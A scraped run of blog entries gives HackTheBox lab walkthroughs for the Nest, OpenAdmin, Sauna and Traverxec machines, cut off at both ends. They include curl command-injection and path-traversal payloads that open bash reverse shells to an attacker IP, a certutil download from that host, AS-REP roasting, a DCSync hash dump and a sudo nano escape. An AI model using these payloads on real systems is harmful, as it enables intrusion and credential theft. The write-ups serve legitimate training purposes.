2023-07-04T18:27:07 |_ start_date: 2023-07-04T18:17:55 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 203.70 seconds smb Let\u0026rsquo;s download txt files and check them We got creds Let\u0026rsquo;s also check another open port We see a HQK reporting service running We can input help command to see the list of available commands The only interesting thing found is Debug command, but it requires password Foothold Let\u0026rsquo;s try using the creds found in smb â””â”€$ smbmap -H 10.10.10.178 -R -u \u0026#39;TempUser\u0026#39; -p \u0026#39;welcome2019\u0026#39; [+] IP: 10.10.10.178:445 Name: 10.10.10.178 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share Data READ ONLY .\\Data\\* dr--r--r-- 0 Wed Aug 7 23:53:46 2019 . dr--r--r-- 0 Wed Aug 7 23:53:46 2019 .. dr--r--r-- 0 Wed Aug 7 23:58:07 2019 IT dr--r--r-- 0 Mon Aug 5 22:53:41 2019 Production dr--r--r-- 0 Mon Aug 5 22:53:50 2019 Reports dr--r--r-- 0 Wed Aug 7 20:07:51 2019 Shared .\\Data\\IT\\* dr--r--r-- 0 Wed Aug 7 23:58:07 2019 . dr--r--r-- 0 Wed Aug 7 23:58:07 2019 .. dr--r--r-- 0 Wed Aug 7 23:58:07 2019 Archive dr--r--r-- 0 Wed Aug 7 23:59:34 2019 Configs dr--r--r-- 0 Wed Aug 7 23:08:30 2019 Installs dr--r--r-- 0 Wed Jul 21 19:47:16 2021 Reports dr--r--r-- 0 Mon Aug 5 23:33:51 2019 Tools .\\Data\\IT\\Configs\\* dr--r--r-- 0 Wed Aug 7 23:59:34 2019 . dr--r--r-- 0 Wed Aug 7 23:59:34 2019 .. dr--r--r-- 0 Wed Jul 21 19:47:13 2021 Adobe dr--r--r-- 0 Wed Jul 21 19:47:04 2021 Atlas dr--r--r-- 0 Tue Aug 6 14:27:08 2019 DLink dr--r--r-- 0 Wed Aug 7 20:23:26 2019 Microsoft dr--r--r-- 0 Wed Jul 21 19:47:13 2021 NotepadPlusPlus dr--r--r-- 0 Wed Jul 21 19:47:05 2021 RU Scanner dr--r--r-- 0 Tue Aug 6 14:27:09 2019 Server Manager .\\Data\\IT\\Configs\\Adobe\\* dr--r--r-- 0 Wed Jul 21 19:47:13 2021 . dr--r--r-- 0 Wed Jul 21 19:47:13 2021 .. fr--r--r-- 246 Wed Jul 21 19:47:12 2021 editing.xml fr--r--r-- 0 Wed Aug 7 20:20:09 2019 Options.txt fr--r--r-- 258 Wed Aug 7 20:20:09 2019 projects.xml fr--r--r-- 1274 Wed Aug 7 20:20:09 2019 settings.xml .\\Data\\IT\\Configs\\Atlas\\* dr--r--r-- 0 Wed Jul 21 19:47:04 2021 . dr--r--r-- 0 Wed Jul 21 19:47:04 2021 .. fr--r--r-- 1369 Wed Jul 21 19:47:04 2021 Temp.XML .\\Data\\IT\\Configs\\Microsoft\\* dr--r--r-- 0 Wed Aug 7 20:23:26 2019 . dr--r--r-- 0 Wed Aug 7 20:23:26 2019 .. fr--r--r-- 4598 Wed Aug 7 20:23:26 2019 Options.xml .\\Data\\IT\\Configs\\NotepadPlusPlus\\* dr--r--r-- 0 Wed Jul 21 19:47:13 2021 . dr--r--r-- 0 Wed Jul 21 19:47:13 2021 .. fr--r--r-- 6451 Wed Jul 21 19:47:13 2021 config.xml fr--r--r-- 2108 Wed Jul 21 19:47:15 2021 shortcuts.xml .\\Data\\IT\\Configs\\RU Scanner\\* dr--r--r-- 0 Wed Jul 21 19:47:05 2021 . dr--r--r-- 0 Wed Jul 21 19:47:05 2021 .. fr--r--r-- 270 Wed Jul 21 19:47:14 2021 RU_config.xml .\\Data\\Shared\\* dr--r--r-- 0 Wed Aug 7 20:07:51 2019 . dr--r--r-- 0 Wed Aug 7 20:07:51 2019 .. dr--r--r-- 0 Wed Jul 21 19:47:12 2021 Maintenance dr--r--r-- 0 Wed Jul 21 19:47:12 2021 Templates .\\Data\\Shared\\Maintenance\\* dr--r--r-- 0 Wed Jul 21 19:47:12 2021 . dr--r--r-- 0 Wed Jul 21 19:47:12 2021 .. fr--r--r-- 48 Wed Jul 21 19:47:05 2021 Maintenance Alerts.txt .\\Data\\Shared\\Templates\\* dr--r--r-- 0 Wed Jul 21 19:47:12 2021 . dr--r--r-- 0 Wed Jul 21 19:47:12 2021 .. dr--r--r-- 0 Wed Jul 21 19:47:12 2021 HR dr--r--r-- 0 Wed Aug 7 20:08:07 2019 Marketing .\\Data\\Shared\\Templates\\HR\\* dr--r--r-- 0 Wed Jul 21 19:47:12 2021 . dr--r--r-- 0 Wed Jul 21 19:47:12 2021 .. fr--r--r-- 425 Wed Jul 21 19:47:12 2021 Welcome Email.txt IPC$ NO ACCESS Remote IPC Secure$ READ ONLY .\\Secure$\\* dr--r--r-- 0 Thu Aug 8 00:08:12 2019 . dr--r--r-- 0 Thu Aug 8 00:08:12 2019 .. dr--r--r-- 0 Wed Aug 7 20:40:25 2019 Finance dr--r--r-- 0 Thu Aug 8 00:08:12 2019 HR dr--r--r-- 0 Thu Aug 8 11:59:25 2019 IT Users READ ONLY .\\Users\\* dr--r--r-- 0 Sat Jan 25 23:04:21 2020 . dr--r--r-- 0 Sat Jan 25 23:04:21 2020 .. dr--r--r-- 0 Wed Jul 21 19:47:04 2021 Administrator dr--r--r-- 0 Wed Jul 21 19:47:04 2021 C.Smith dr--r--r-- 0 Thu Aug 8 18:03:29 2019 L.Frost dr--r--r-- 0 Thu Aug 8 18:02:56 2019 R.Thompson dr--r--r-- 0 Wed Jul 21 19:47:15 2021 TempUser .\\Users\\TempUser\\* dr--r--r-- 0 Wed Jul 21 19:47:15 2021 . dr--r--r-- 0 Wed Jul 21 19:47:15 2021 .. fr--r--r-- 0 Wed Jul 21 19:47:15 2021 New Text Document.txt Let\u0026rsquo;s download the files and check them Search for password word in files resulted in encrypted password for c.smith c.smith:fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE= The password looks encrypted You will also find Notepad++ config in IT/Configs/NotepadPlusPlus/config.xml It has an interesting parameters set pointing to Secure$\\IT\\Carl Let\u0026rsquo;s try to visit the path Let\u0026rsquo;s download the content In VB Projects folder I found an interesting file Module1.vb1 Which opens RU_Config.xml and decrypts the password Since we have sln project I will open it in Visual Studio The build was successful, but execution throws an exception since it can\u0026rsquo;t find the config file So I uploaded the config file next to the binary and executed it Don\u0026rsquo;t forget to add a breakpoint so we can retrieve the password c.smith:xRxRxPANCAK3SxRxRx We can\u0026rsquo;t launch shell, but we can get our flag Root We found HQK Reporting folder inside C.Smith\u0026rsquo;s directory I downloaded whole directory and found Debug Mode Password.txt file, but it was empty Then I checked other files, but found nothing Checked password file on smb using allinfo and found an alternative data stream The password was stored there WBQ201953D8w Now we can access debug menu in HQK Now we can read files with SHOWQUERY Found a config file with encrypted password for Administrator And executable file HqKLdap.exe which I saw previously in C.Smith\u0026rsquo;s directory Let\u0026rsquo;s debug it Open executable using dnSpy If we check main function we see that it performs several checks We can create fake file just to pass the check Set the breakpoint for ldap module and start debugging by supplying ldap.conf that we saw in HQK service Administrator:XtH4nkS4Pl4y1nGX Rooted ","date":"June 26, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/nest/images/nest.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/nest/","summary":"Nest Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.178 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 19:24 BST Nmap scan report for 10.10.10.178 (10.10.10.178) Host is up (0.10s latency). PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 4386/tcp open unknown | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: | Reporting Service V1.2 | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: | Reporting Service V1.","tags":["HTB","dnspy","visual-studio","smb","alternative-data-streams"],"title":"[HTB] Machine: Nest"},{"categories":null,"contents":"OpenAdmin Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.171 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 17:39 BST Nmap scan report for 10.10.10.171 (10.10.10.171) Host is up (0.19s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b98df85d17ef03dda48cdbc9200b754 (RSA) | 256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA) |_ 256 dcadca3c11315b6fe6a489347c9be550 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 36.34 seconds gobuster â””â”€$ gobuster dir -u http://10.10.10.171 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,txt,php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.171 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== 2023/06/27 17:52:42 Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 277] /.php (Status: 403) [Size: 277] /index.html (Status: 200) [Size: 10918] /music (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.171/music/] /artwork (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.171/artwork/] /sierra (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.171/sierra/] /.php (Status: 403) [Size: 277] /.html (Status: 403) [Size: 277] Web server /ona\nIf you click login on /music page, it will redirect you to /ona page\nFoothold searchsploit Check exploit We can test it manually curl -s -d \u0026quot;xajax=window_submit\u0026amp;xajaxr=1574117726710\u0026amp;xajaxargs[]=tooltips\u0026amp;xajaxargs[]=ip%3D%3E;id\u0026amp;xajaxargs[]=ping\u0026quot; http://10.10.10.171/ona/ Let\u0026rsquo;s try reverse shell curl -s -d \u0026quot;xajax=window_submit\u0026amp;xajaxr=1574117726710\u0026amp;xajaxargs[]=tooltips\u0026amp;xajaxargs[]=ip%3D%3E;bash -c 'bash -i \u0026gt;%26 /dev/tcp/10.10.16.7/6666 0\u0026gt;%261'\u0026amp;xajaxargs[]=ping\u0026quot; http://10.10.10.171/ona/ User 1 Enumerating for privesc Started from local directory grep -inRE \u0026quot;*passwd*\u0026quot; . to search for config files with password Open mysql Before cracking let\u0026rsquo;s try su for password reuse with n1nj4W4rri0R! And it works for jimmy User 2 We see a folder owned by jimmy We see the source files Let\u0026rsquo;s check open ports Strange port 52846 And if apache or nginx was running (ona was hosted by apache) internal.openadmin.htb on port 52846 Let\u0026rsquo;s configure port forwarding via SSH Webshell We can create webshell php file and access it Let\u0026rsquo;s get reverse shell SSH If we read source code of internal we can see that after login we will get a joanna\u0026rsquo;s key And the creds for access are hardcoded I tried connecting with the key, but it was encrypted So I used john to find a passphrase bloodninjas Root Started with checking sudo rights GTFOBins Steps: sudo /bin/nano /opt/priv CTRL + R CTRL + X reset; sh 1\u0026gt;\u0026amp;0 2\u0026gt;\u0026amp;0 Rooted ","date":"June 26, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/openadmin/images/openadmin.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/openadmin/","summary":"OpenAdmin Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.171 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 17:39 BST Nmap scan report for 10.10.10.171 (10.10.10.171) Host is up (0.19s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b98df85d17ef03dda48cdbc9200b754 (RSA) | 256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA) |_ 256 dcadca3c11315b6fe6a489347c9be550 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: OpenAdmin"},{"categories":null,"contents":"Sauna Enumeration nmap â””â”€$ nmap -Pn -sC -sV 10.10.10.175 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-28 17:36 BST Nmap scan report for 10.10.10.175 (10.10.10.175) Host is up (0.11s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-28 23:35:53Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 6h59m29s | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2023-06-28T23:36:05 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 69.94 seconds gobuster â””â”€$ gobuster dir -u http://10.10.10.175 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x asp,aspx =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.175 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: aspx,asp [+] Timeout: 10s =============================================================== 2023/06/28 18:47:01 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.175/images/] /Images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.175/Images/] /css (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.175/css/] /fonts (Status: 301) [Size: 149] [--\u0026gt; http://10.10.10.175/fonts/] /IMAGES (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.175/IMAGES/] /Fonts (Status: 301) [Size: 149] [--\u0026gt; http://10.10.10.175/Fonts/] /CSS (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.175/CSS/] smbclient found nothing â””â”€$ smbclient -N -L //10.10.10.175 Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available Web server ldapsearch â””â”€$ ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 â””â”€$ ldapsearch -x -H ldap://10.10.10.175 -b \u0026#39;DC=EGOTISTICAL-BANK,DC=LOCAL\u0026#39; # extended LDIF # # LDAPv3 # base \u0026lt;DC=EGOTISTICAL-BANK,DC=LOCAL\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # EGOTISTICAL-BANK.LOCAL dn: DC=EGOTISTICAL-BANK,DC=LOCAL objectClass: top objectClass: domain objectClass: domainDNS distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL instanceType: 5 whenCreated: 20200123054425.0Z whenChanged: 20230628233031.0Z subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL uSNCreated: 4099 dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A== uSNChanged: 98336 name: EGOTISTICAL-BANK objectGUID:: 7AZOUMEioUOTwM9IB/gzYw== replUpToDateVector:: AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAAJZTr RoDAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj+FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4 TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA== creationTime: 133324686314808354 forceLogoff: -9223372036854775808 lockoutDuration: -18000000000 lockOutObservationWindow: -18000000000 lockoutThreshold: 0 maxPwdAge: -36288000000000 minPwdAge: -864000000000 minPwdLength: 7 modifiedCountAtLastProm: 0 nextRid: 1000 pwdProperties: 1 pwdHistoryLength: 24 objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG serverState: 1 uASCompat: 1 modifiedCount: 1 auditingPolicy:: AAE= nTMixedDomain: 0 rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL systemFlags: -1946157056 wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT ISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra m Data,DC=EGOTISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO TISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin cipals,DC=EGOTISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC= EGOTISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E GOTISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO TISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC AL-BANK,DC=LOCAL wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers, DC=EGOTISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS TICAL-BANK,DC=LOCAL wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA L-BANK,DC=LOCAL objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D C=LOCAL isCriticalSystemObject: TRUE gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste m,DC=EGOTISTICAL-BANK,DC=LOCAL;0] dSCorePropagationData: 16010101000000.0Z otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS TICAL-BANK,DC=LOCAL otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL ms-DS-MachineAccountQuota: 10 msDS-Behavior-Version: 7 msDS-PerUserTrustQuota: 1 msDS-AllUsersTrustQuota: 1000 msDS-PerUserTrustTombstonesQuota: 10 msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL msDS-NcType: 0 msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE dc: EGOTISTICAL-BANK # Users, EGOTISTICAL-BANK.LOCAL dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL # Computers, EGOTISTICAL-BANK.LOCAL dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL # Domain Controllers, EGOTISTICAL-BANK.LOCAL dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL # System, EGOTISTICAL-BANK.LOCAL dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL # LostAndFound, EGOTISTICAL-BANK.LOCAL dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL # Infrastructure, EGOTISTICAL-BANK.LOCAL dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL # ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL # Program Data, EGOTISTICAL-BANK.LOCAL dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL # NTDS Quotas, EGOTISTICAL-BANK.LOCAL dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL # Managed Service Accounts, EGOTISTICAL-BANK.LOCAL dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL # Keys, EGOTISTICAL-BANK.LOCAL dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL # TPM Devices, EGOTISTICAL-BANK.LOCAL dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL # Builtin, EGOTISTICAL-BANK.LOCAL dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL # Hugo Smith, EGOTISTICAL-BANK.LOCAL dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL # search reference ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST ICAL-BANK,DC=LOCAL # search reference ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST ICAL-BANK,DC=LOCAL # search reference ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC AL # search result search: 2 result: 0 Success # numResponses: 19 # numEntries: 15 # numReferences: 3 DNS We so far we have nothing We can try enumerating users via Kerberos on port 88 Let\u0026rsquo;s use kerbrute kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt We get several usernames Yet it takes a while to run So I as soon as I saw username policy, where fsmith is Fergus Smith Check the website for other possible usernames So let\u0026rsquo;s create a user list I also added sauna as it\u0026rsquo;s a box name Foothold Since we have a user list We can try to check for AS-REP Roasting impacket-GetNPUsers EGOTISTICAL-BANK.local/ -dc-ip 10.10.10.175 -usersfile user.list -format hashcat -no-pass Let\u0026rsquo;s crack the hash hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt fsmith:Thestrokes23 We can use evil-winrm to connect User Enumerate for privesc Download winpeas: certutil -urlcache -f http://10.10.16.7:8000/winpeas.exe winpeas.exe There are 3 users: hsmith, fsmith, svc_loanmgr And we found autologon creds for svc_loanmgr:Moneymakestheworldgoround! Use creds to connect as svc_loanmgr to the box via evil-winrm Root Enumerate for privesc Found nothing using winpeas So I ran bloodhound to gather domain info bloodhound-python -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -dc SAUNA.EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c all --zip Start neo4j: sudo neo4j start Start bloodhound We can see that svc_loanmgr can perform dcsyns Let\u0026rsquo;s exploit that impacket-secretsdump 'svc_loanmgr:Moneymakestheworldgoround!'@10.10.10.175 Use hashes to connect using psexec Rooted ","date":"June 26, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/sauna/images/sauna.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/sauna/","summary":"Sauna Enumeration nmap â””â”€$ nmap -Pn -sC -sV 10.10.10.175 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-28 17:36 BST Nmap scan report for 10.10.10.175 (10.10.10.175) Host is up (0.11s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-28 23:35:53Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.","tags":["HTB"],"title":"[HTB] Machine: Sauna"},{"categories":null,"contents":"Traverxec Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.165 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 19:35 BST Nmap scan report for 10.10.10.165 (10.10.10.165) Host is up (0.096s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa99a81668cd41ccf96c8401c759095c (RSA) | 256 93dd1a23eed71f086b58470973a388cc (ECDSA) |_ 256 9dd6621e7afb8f5692e637f110db9bce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-server-header: nostromo 1.9.6 |_http-title: TRAVERXEC Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.10 seconds Web server gobuster â””â”€$ gobuster dir -u http://10.10.10.165 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.165 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/27 19:39:09 Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.165/img/] /icons (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.165/icons/] /css (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.165/css/] /lib (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.165/lib/] /js (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.165/js/] Foothold From nmap results we see nostromo 1.9.6 Check searchsploit We can test poc It works Let\u0026rsquo;s get a reverse shell curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c \u0026quot;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.7/6666 0\u0026gt;\u0026amp;1\u0026quot;' User Let\u0026rsquo;s enumerate with linpeas Found .htpasswd and nhttpd.conf Starts hashcat, since it will take a while to crack echo 'david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' \u0026gt; david.hash hashcat -m 500 david.hash /usr/share/wordlists/rockyou.txt --username Resulted in david:Nowonly4me su doesn\u0026rsquo;t work In nhttpd.conf we can see homedirs parameter set to /home According to docs, it means that So we can visit http://10.10.10.165/~david/ From the config file we also saw that homedirs_public is set topublic_www Which means that there is public_www folder inside /home/david which probably can be accessed as www-data user I tried sending file via nc but it didn\u0026rsquo;t work Then I tried downloading it using wget since we have creds for david and config 